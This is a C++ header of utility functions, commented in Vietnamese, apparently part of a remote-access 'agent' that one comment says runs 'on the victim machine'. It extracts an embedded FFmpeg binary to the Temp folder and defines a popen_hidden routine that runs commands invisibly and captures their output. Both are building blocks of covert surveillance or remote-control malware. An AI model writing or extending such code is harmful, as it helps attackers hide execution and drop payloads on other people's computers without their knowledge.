// File này định nghĩa các hàm tiện ích dùng chung cho toàn project

#pragma once
#include <windows.h>
#include <stdio.h>
#include <fcntl.h>
#include <io.h>
#include <string>
#include <fstream>
#include <vector>
#include <filesystem>

// Hàm trích xuất Resource ra file
inline bool ExtractResource(int resourceId, const std::string& outputFilename) {
    // 1. Tìm resource trong file .exe hiện tại
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (!hResource) return false;

    // 2. Load resource vào bộ nhớ
    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    if (!hLoadedResource) return false;

    // 3. Khóa resource để lấy con trỏ
    void* pResourceData = LockResource(hLoadedResource);
    DWORD resourceSize = SizeofResource(NULL, hResource);
    if (!pResourceData || resourceSize == 0) return false;

    // 4. Ghi ra file
    std::ofstream outFile(outputFilename, std::ios::binary);
    if (!outFile) return false;

    outFile.write(static_cast<const char*>(pResourceData), resourceSize);
    outFile.close();

    return true;
}

// Hàm lấy đường dẫn FFmpeg trong thư mục Temp sẽ khởi tạo khi chạy agent.exe trên máy victim
inline std::string getFFmpegPath() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    return std::string(tempPath) + "ffmpeg_agent.exe";
}

/**
 * @brief Thay thế cho _popen nhưng chạy ẩn (SW_HIDE)
 * @param cmd Lệnh cần chạy
 * @param mode Chế độ ("r" hoặc "rb")
 * @return FILE* để đọc dữ liệu
 */
inline FILE* popen_hidden(const char* cmd, const char* mode) {
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE; // Cho phép process con thừa kế handle
    sa.lpSecurityDescriptor = NULL;

    // 1. Tạo Pipe
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return NULL;
    }

    // Đảm bảo handle đọc KHÔNG bị thừa kế (chỉ handle ghi được thừa kế)
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    // 2. Cấu hình STARTUPINFO để ẩn cửa sổ
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // ẨN CỬA SỔ
    si.hStdOutput = hWritePipe; // Output của con đi vào Pipe
    si.hStdError = hWritePipe;  // Error của con cũng đi vào Pipe (để debug nếu cần)
    // Input để NULL (hoặc GetStdHandle(STD_INPUT_HANDLE) nếu cần)

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // 3. Tạo Process
    char* cmdBuf = _strdup(cmd);
    
    BOOL success = CreateProcessA(
        NULL, 
        cmdBuf, 
        NULL, 
        NULL, 
        TRUE, // bInheritHandles = TRUE
        CREATE_NO_WINDOW, // Flag bổ sung để chắc chắn không hiện window
        NULL, 
        NULL, 
        &si, 
        &pi
    );

    free(cmdBuf);

    // Sau khi tạo xong, Process cha (Agent) không cần handle ghi nữa
    CloseHandle(hWritePipe);

    if (!success) {
        CloseHandle(hReadPipe);
        return NULL;
    }

    // Đóng handle quản lý process (vì ta không cần wait)
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // 4. Chuyển đổi Handle sang FILE* để code cũ (fread/fgets) vẫn chạy được
    int fd = _open_osfhandle((intptr_t)hReadPipe, _O_RDONLY | (_stricmp(mode, "rb") == 0 ? _O_BINARY : _O_TEXT));
    if (fd == -1) {
        CloseHandle(hReadPipe);
        return NULL;
    }

    return _fdopen(fd, mode);
}